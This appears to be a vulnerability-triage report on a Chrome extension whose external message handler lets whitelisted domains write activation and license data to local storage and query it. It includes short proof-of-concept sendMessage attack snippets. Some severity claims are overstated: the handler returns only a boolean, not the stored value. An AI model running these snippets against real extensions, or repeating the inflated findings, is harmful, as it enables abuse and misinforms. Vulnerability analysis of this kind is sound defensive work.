# CoCo Analysis: jgnejnfdbomaelibbccppknilnnhklnk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jgnejnfdbomaelibbccppknilnnhklnk/opgen_generated_files/bg.js
Line 965 - chrome.runtime.onMessageExternal.addListener with storage.set

**Code:**

```javascript
// Background script - Line 965 in bg.js
chrome.runtime.onMessageExternal.addListener((function(t,e,a){
    if(t.heartbeat) {
        a({success:!0})
    } else if(t.activate) {
        chrome.storage.local.set({
            activation:t.activate,  // ← attacker-controlled
            license:t.license       // ← attacker-controlled
        },(function(){
            a({success:!0})
        }))
    } else if(t.activation_check) {
        chrome.storage.local.get(["activation"],(function(t){
            a({activated:!!t.activation})  // ← sends stored value back to attacker
        }))
    }
}))
```

**Classification:** TRUE POSITIVE (part of complete exploitation chain)

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Attacker on *.camflip.net/* domain can:

// 1. Write arbitrary data to storage
chrome.runtime.sendMessage('EXTENSION_ID', {
    activate: 'malicious_activation_code',
    license: 'attacker_controlled_license'
}, function(response) {
    console.log('Poisoned storage:', response);
});

// 2. Read the stored data back
chrome.runtime.sendMessage('EXTENSION_ID', {
    activation_check: true
}, function(response) {
    console.log('Retrieved activation:', response.activated);
    // Attacker successfully retrieved the poisoned value
});
```

**Impact:** Complete storage exploitation chain. External attacker from whitelisted domains (*.camflip.net/*, etc.) can both write arbitrary activation/license data to chrome.storage.local and read it back via sendResponse. This enables storage-based information disclosure and potential storage poisoning attacks that could affect extension functionality.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (license field)

**CoCo Trace:**
Same as Sink 1, second field (license)

**Classification:** TRUE POSITIVE (part of same exploitation chain)

**Reason:** Same as Sink 1 - both activation and license fields are attacker-controlled and stored.

---

## Sink 3: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jgnejnfdbomaelibbccppknilnnhklnk/opgen_generated_files/bg.js
Line 965 - storage.get retrieval sent to sendResponse

**Code:**

```javascript
// Background script - Line 965 in bg.js
chrome.runtime.onMessageExternal.addListener((function(t,e,a){
    // ... other handlers ...
    if(t.activation_check) {
        chrome.storage.local.get(["activation"],(function(t){
            a({activated:!!t.activation})  // ← retrieval sink - sends back to attacker
        }))
    }
}))
```

**Classification:** TRUE POSITIVE (completes the exploitation chain)

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Attacker on *.camflip.net/* can retrieve stored data
chrome.runtime.sendMessage('EXTENSION_ID', {
    activation_check: true
}, function(response) {
    console.log('Leaked activation status:', response.activated);
    // Attacker receives the stored activation value
});
```

**Impact:** Information disclosure. Completes the storage exploitation chain by allowing external attackers to retrieve values previously stored in chrome.storage.local. This enables reading potentially sensitive activation/license information.

---

**Note:** Per the methodology, IGNORE manifest.json externally_connectable restrictions. Even though only *.camflip.net/* domains are whitelisted, the vulnerability is classified as TRUE POSITIVE because "if even ONE webpage/extension can trigger it, classify as TRUE POSITIVE."
